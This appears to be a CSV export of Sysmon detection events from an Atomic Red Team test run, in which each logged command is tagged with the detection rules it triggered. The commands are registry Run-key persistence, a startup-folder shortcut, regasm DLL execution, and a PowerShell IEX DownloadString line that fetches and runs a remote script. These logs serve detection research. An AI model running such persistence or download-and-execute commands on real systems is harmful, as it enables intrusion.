2019-07-19T14:44:53.292455+00:00,CurrentVersion Autorun Keys Modification,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,13,3595,MSEDGEWIN10,"Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Run\Atomic Red Team
RuleName: Persistence - via Run key
EventType: SetValue
ProcessId: 2068
ProcessGuid: 747F3D96-D765-5D31-0000-001086B92800
UtcTime: 2019-07-19 14:44:53.261
Details: C:\Path\AtomicRedTeam.exe
"
2019-07-19T14:44:53.330492+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3596,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 5824
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D765-5D31-0000-0010D7BD2800
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""REG DELETE "" ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Atomic"" Red ""Team /f""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:44:53.314
"
2019-07-19T14:44:53.349171+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3597,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""REG DELETE "" ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Atomic"" Red ""Team /f""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 5824
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-D765-5D31-0000-0010D7BD2800
ProcessId: 2912
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D765-5D31-0000-001022C02800
CommandLine: REG  DELETE "" ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Atomic"" Red ""Team /f
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:44:53.337
"
2019-07-19T14:44:53.402498+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3599,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 4264
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D765-5D31-0000-001024C32800
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:44:53.388
"
2019-07-19T14:45:06.075725+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3600,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 3216
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D772-5D31-0000-0010BEE52800
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "" C:\Path\AtomicRedTeam.dll'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:45:06.056
"
2019-07-19T14:45:06.137175+00:00,Direct Autorun Keys Modification;Hacktool - EDR-Freeze Execution;Potential Persistence Attempt Via Run Keys Using Reg.EXE;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3601,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "" C:\Path\AtomicRedTeam.dll'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3216
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-D772-5D31-0000-0010BEE52800
ProcessId: 3772
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D772-5D31-0000-001010E82800
CommandLine: REG  ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d  C:\Path\AtomicRedTeam.dll
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:45:06.132
"
2019-07-19T14:45:06.161409+00:00,CurrentVersion Autorun Keys Modification,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,13,3602,MSEDGEWIN10,"Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend\1
RuleName: Persistence - via Run key
EventType: SetValue
ProcessId: 3772
ProcessGuid: 747F3D96-D772-5D31-0000-001010E82800
UtcTime: 2019-07-19 14:45:06.150
Details: C:\Path\AtomicRedTeam.dll
"
2019-07-19T14:45:06.196458+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3603,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6472
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D772-5D31-0000-001031EB2800
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:45:06.180
"
2019-07-19T14:45:06.213488+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3604,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6472
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-D772-5D31-0000-001031EB2800
ProcessId: 6120
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D772-5D31-0000-001083ED2800
CommandLine: REG  DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:45:06.209
"
2019-07-19T14:45:06.267992+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3606,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 324
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D772-5D31-0000-00107CF02800
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:45:06.251
"
2019-07-19T14:45:19.483250+00:00,CurrentVersion Autorun Keys Modification;Suspicious PowerShell In Registry Run Keys,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,13,3607,MSEDGEWIN10,"Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\NextRun
RuleName: Persistence - via Run key
EventType: SetValue
ProcessId: 3912
ProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
UtcTime: 2019-07-19 14:45:19.416
Details: powershell.exe ""IEX (New-Object Net.WebClient).DownloadString(`""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`"")""
"
2019-07-19T14:45:31.287863+00:00,Potential Startup Shortcut Persistence Via PowerShell.EXE;Startup Folder File Write,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,11,3609,MSEDGEWIN10,"ProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
CreationUtcTime: 2019-07-18 20:53:13.080
UtcTime: 2019-07-19 14:45:31.276
ProcessId: 3912
RuleName: ''
TargetFilename: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Notepad.lnk
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
"
2019-07-19T14:45:55.034352+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3610,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6748
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D7A3-5D31-0000-0010A0A22900
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library C:\AtomicRedTeam\atomics\T1121\src\T1121.cs""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:45:55.023
"
2019-07-19T14:45:55.105804+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3611,MSEDGEWIN10,"Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
RuleName: ''
Description: Visual C# Command Line Compiler
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library C:\AtomicRedTeam\atomics\T1121\src\T1121.cs""'
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
ParentProcessId: 6748
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=ABAF24113034BBA4B4F4AC19D9097D36943D2E35,MD5=B87EE552626023951A7F03F2D31DA8A7,SHA256=D511363874B2A00D3DA5A20E6AE826334795A3A52AB5F8555C309D8068F5915B,IMPHASH=C4963CB3AF58DCFC863E42DD3B6FB80D
ParentProcessGuid: 747F3D96-D7A3-5D31-0000-0010A0A22900
ProcessId: 4784
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D7A3-5D31-0000-0010F2A42900
CommandLine: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /r:System.EnterpriseServices.dll /target:library C:\AtomicRedTeam\atomics\T1121\src\T1121.cs
FileVersion: '4.7.3190.0 built by: NET472REL1LAST_C'
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:45:55.057
"
2019-07-19T14:45:55.621447+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3612,MSEDGEWIN10,"Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe
RuleName: ''
Description: Microsoft® Resource File To COFF Object Conversion Utility
TerminalSessionId: 1
ParentCommandLine: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /r:System.EnterpriseServices.dll /target:library C:\AtomicRedTeam\atomics\T1121\src\T1121.cs
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
ParentProcessId: 4784
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=31B7A087F3C0325D11F8DE298F2D601AB8F94897,MD5=C09985AE74F0882F208D75DE27770DFA,SHA256=E24570ABD130832732D0DD3EC4EFB6E3E1835064513C8B8A2B1AE0D530B04534,IMPHASH=49D51E5A9546CAB5B1356F947A3B973C
ParentProcessGuid: 747F3D96-D7A3-5D31-0000-0010F2A42900
ProcessId: 6344
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D7A3-5D31-0000-001035B02900
CommandLine: C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\IEUser\AppData\Local\Temp\RESBED6.tmp"" ""c:\AtomicRedTeam\CSC5779B24A646D409A951966A058ABC4E3.TMP""
FileVersion: '12.00.52519.0 built by: VSWINSERVICING'
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
UtcTime: 2019-07-19 14:45:55.616
"
2019-07-19T14:45:55.681219+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3613,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 5800
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D7A3-5D31-0000-001081B22900
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U T1121.dll""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:45:55.672
"
2019-07-19T14:45:55.699293+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3614,MSEDGEWIN10,"Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe
RuleName: ''
Description: Microsoft .NET Assembly Registration Utility
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U T1121.dll""'
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
ParentProcessId: 5800
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=A580AF099F754953480323F6369E5534261F082E,MD5=E99BD2E860B0D73E55708200A600DA35,SHA256=CD5FBB0AC9EBBD64AE84624D428CE30FF17FD586F71F8C5580BC57B176E6716B,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744
ParentProcessGuid: 747F3D96-D7A3-5D31-0000-001081B22900
ProcessId: 6176
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D7A3-5D31-0000-0010D2B42900
CommandLine: C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe  /U T1121.dll
FileVersion: '4.7.3190.0 built by: NET472REL1LAST_C'
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:45:55.694
"
2019-07-19T14:45:56.033241+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3615,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6804
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D7A4-5D31-0000-0010C9C22900
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""del T1121.dll""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:45:56.002
"
2019-07-19T14:45:56.069498+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3616,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 4080
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D7A4-5D31-0000-001020C62900
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:45:56.040
"
2019-07-19T14:46:19.052666+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3617,MSEDGEWIN10,"Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
RuleName: ''
Description: Visual C# Command Line Compiler
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=ABAF24113034BBA4B4F4AC19D9097D36943D2E35,MD5=B87EE552626023951A7F03F2D31DA8A7,SHA256=D511363874B2A00D3DA5A20E6AE826334795A3A52AB5F8555C309D8068F5915B,IMPHASH=C4963CB3AF58DCFC863E42DD3B6FB80D
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 2056
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D7BB-5D31-0000-0010E7FE2900
CommandLine: '""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"" /r:System.EnterpriseServices.dll /target:library /keyfile:key.snk C:\AtomicRedTeam\atomics\T1121\src\T1121.cs'
FileVersion: '4.7.3190.0 built by: NET472REL1LAST_C'
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:46:19.023
"
2019-07-19T14:46:19.443587+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3618,MSEDGEWIN10,"Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe
RuleName: ''
Description: Microsoft® Resource File To COFF Object Conversion Utility
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"" /r:System.EnterpriseServices.dll /target:library /keyfile:key.snk C:\AtomicRedTeam\atomics\T1121\src\T1121.cs'
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
ParentProcessId: 2056
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=31B7A087F3C0325D11F8DE298F2D601AB8F94897,MD5=C09985AE74F0882F208D75DE27770DFA,SHA256=E24570ABD130832732D0DD3EC4EFB6E3E1835064513C8B8A2B1AE0D530B04534,IMPHASH=49D51E5A9546CAB5B1356F947A3B973C
ParentProcessGuid: 747F3D96-D7BB-5D31-0000-0010E7FE2900
ProcessId: 4124
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D7BB-5D31-0000-00108F082A00
CommandLine: C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\IEUser\AppData\Local\Temp\RES1BEA.tmp"" ""c:\AtomicRedTeam\CSC8EBD65DB33242A1BAD76494F485AF42.TMP""
FileVersion: '12.00.52519.0 built by: VSWINSERVICING'
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
UtcTime: 2019-07-19 14:46:19.439
"
